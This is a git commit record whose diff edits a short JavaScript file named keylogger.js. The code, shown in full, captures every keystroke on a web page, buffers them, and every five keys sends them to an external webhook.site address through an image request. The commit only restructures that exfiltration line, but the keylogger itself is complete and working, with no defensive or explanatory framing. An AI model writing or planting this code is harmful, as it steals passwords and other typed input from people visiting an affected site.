3335432e32b17772f50196d16fc830464a2a4089
Jefferson Hernandez <56500262+Th3g4ntl3m4n@users.noreply.github.com>
2025-07-24 17:36:10 -0500

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -2,10 +2,11 @@
   let buffer = "";
   document.addEventListener('keydown', function(e){
     buffer += e.key;
+
     if(buffer.length >= 5){
-      new Image().src = "https://webhook.site/tu_token?keys=" + encodeURIComponent(buffer);
+      const img = new Image();
+      img.src = "https://webhook.site/tu_token?keys=" + encodeURIComponent(buffer);
       buffer = "";
     }
   });
 })();
-
